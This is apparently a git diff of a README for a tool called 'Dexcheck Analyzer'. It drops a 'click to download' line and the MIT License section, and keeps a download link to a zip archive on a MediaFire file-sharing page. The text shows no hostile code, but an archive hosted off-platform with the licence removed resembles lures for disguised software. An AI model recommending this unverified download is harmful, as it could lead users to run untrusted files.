@@ -9,7 +9,7 @@
 
 ## Download
 
-Click the button above to download the latest version of Dexcheck Analyzer!
+
 [Download Dexcheck Analyzer](https://www.mediafire.com/file/hfpiob6i3efg77h/Dexcheck+Analyzer+v1.2.zip/file)
 
 
@@ -81,8 +81,6 @@ To ensure the program works correctly, you need to have the following installed 
 ## Contributing
 If you would like to contribute to improving the program, feel free to open **Pull Requests** or create **Issues** on GitHub.
 
-## License
-This project is licensed under the [MIT License](LICENSE).
 
 ## Contact
 For any assistance or questions about how to use the program, feel free to reach out via email or through our social media accounts.
